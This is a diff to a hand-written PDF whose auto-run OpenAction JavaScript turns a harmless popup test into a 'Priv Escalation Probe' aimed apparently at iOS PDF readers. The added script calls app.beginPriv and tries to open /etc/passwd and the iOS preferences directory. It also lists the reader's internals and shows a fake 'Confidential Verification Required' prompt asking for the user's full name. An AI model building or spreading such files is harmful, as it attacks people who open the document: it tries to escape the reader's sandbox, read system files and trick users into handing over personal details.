@@ -1,91 +1,129 @@
 %PDF-1.7
-% Response Return Diagnosis - iOS - March 2026
+% beginPriv File Read Probe + Visible Input on Page - iOS - March 2026
 1 0 obj
 << /Type /Catalog
    /Pages 2 0 R
    /OpenAction 3 0 R
 >>
 endobj
-
 2 0 obj
 << /Type /Pages
    /Kids [4 0 R]
    /Count 1
 >>
 endobj
-
 3 0 obj
 << /Type /Action
    /S /JavaScript
    /JS (
-
-        app.alert("step 1");
-
-        var captured = app.response("Enter test value:", "Power Apps");
-
-        // Show exactly what came back - no condition
-        app.alert("returned type: " + typeof captured);
-        app.alert("returned value: [" + captured + "]");
-        app.alert("is null: " + (captured === null));
-        app.alert("is undefined: " + (captured === undefined));
-        app.alert("length: " + (captured ? captured.length : "n/a"));
-
-        // Now test each method unconditionally
-        app.alert("testing metadata...");
+      try {
+        var results = [];
+        results.push("=== PRIV CONTEXT ===");
         try {
-          this.info.Title = "test";
-          app.alert("title write: " + this.info.Title);
-        } catch(e) { app.alert("title err: " + e); }
+          app.beginPriv();
+          results.push("beginPriv: ok");
+          try {
+            var d1 = app.openDoc("/etc/passwd");
+            results.push("openDoc passwd: " + typeof d1 + " " + d1);
+          } catch(e) { results.push("openDoc passwd: " + e); }
+          try {
+            var d2 = app.openDoc("/var/mobile/Library/Preferences/");
+            results.push("openDoc prefs: " + typeof d2 + " " + d2);
+          } catch(e) { results.push("openDoc prefs: " + e); }
+          try {
+            var d3 = app.openDoc(this.path);
+            results.push("openDoc self: " + typeof d3);
+          } catch(e) { results.push("openDoc self: " + e); }
+          try {
+            results.push("response type: " + typeof app.response);
+          } catch(e) { results.push("response: " + e); }
+          try {
+            results.push("priv doc.path: " + this.path);
+            results.push("priv doc.URL: " + this.URL);
+          } catch(e) { results.push("doc props: " + e); }
+          try {
+            var privKeys = [];
+            for (var k in app) {
+              privKeys.push(k + ":" + typeof app[k]);
+            }
+            results.push("app keys in priv: " + privKeys.join(", "));
+          } catch(e) { results.push("app enum priv: " + e); }
+          app.endPriv();
+          results.push("endPriv: ok");
+        } catch(e) { results.push("priv block: " + e); }
 
-        app.alert("testing btoa...");
+        results.push("=== INTER-DOC ===");
         try {
-          var b = btoa("testvalue");
-          app.alert("btoa ok: " + b);
-        } catch(e) { app.alert("btoa err: " + e); }
+          results.push("numDocs: " + app.numDocs);
+        } catch(e) { results.push("numDocs: " + e); }
 
-        app.alert("testing addField...");
+        results.push("=== INPUT CAPTURE + VISIBLE ON PAGE ===");
         try {
-          var f = this.addField("exfil", "text", 0, [0,0,1,1]);
-          f.value = "testvalue";
-          app.alert("addField ok: " + f.value);
-        } catch(e) { app.alert("addField err: " + e); }
+          var resp = app.response({
+            cQuestion: "Please enter your full name or any text to verify (it will appear on this document)",
+            cTitle: "Confidential Verification Required",
+            cDefault: ""
+          });
 
-        app.alert("all done");
+          if (resp != null && resp !== "") {
+            results.push("response captured: " + resp);
 
+            // Create visible text field on the page and show the input
+            var f = this.getField("UserInputField");
+            if (f == null) {
+              f = this.addField({
+                cName: "UserInputField",
+                nPage: 0,
+                nType: "text",
+                r: [30, 100, 370, 160]   // position on page (adjust if needed)
+              });
+              f.borderStyle = border.s;
+              f.fillColor = color.white;
+              f.textColor = color.red;
+              f.textSize = 18;
+              f.font = "Helvetica-Bold";
+              f.multiline = true;
+              f.readonly = true;
+            }
+            f.value = "You entered:\n" + resp;
+
+            results.push("Input successfully written to visible field on PDF");
+          } else {
+            results.push("User cancelled or empty input");
+          }
+        } catch(e) { results.push("response / field error: " + e); }
+
+        app.alert(results.join("\\n"));
+      } catch(e) {
+        app.alert("OUTER ERROR: " + e);
+      }
    )
 >>
 endobj
-
 4 0 obj
 << /Type /Page
    /Parent 2 0 R
    /MediaBox [0 0 400 300]
    /Contents 5 0 R
-   /Resources 
-     /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >>
-   >>
 >>
 endobj
-
 5 0 obj
 << /Length 90 >>
 stream
-BT /F1 14 Tf 50 250 Td (Return Diagnosis) Tj ET
-BT /F1 12 Tf 50 220 Td (Watch each popup) Tj ET
+BT /F1 14 Tf 50 250 Td (Priv Escalation Probe) Tj ET
+BT /F1 12 Tf 50 220 Td (Enter text in popup - it will appear below) Tj ET
 endstream
 endobj
-
 xref
 0 6
-0000000000 65535 f 
-0000000015 00000 n 
-0000000075 00000 n 
-0000000135 00000 n 
-0000001600 00000 n 
-0000001760 00000 n 
-
+0000000000 65535 f
+0000000015 00000 n
+0000000075 00000 n
+0000000135 00000 n
+0000002500 00000 n
+0000002660 00000 n
 trailer
 << /Size 6 /Root 1 0 R >>
 startxref
-1850
+2750
 %%EOF
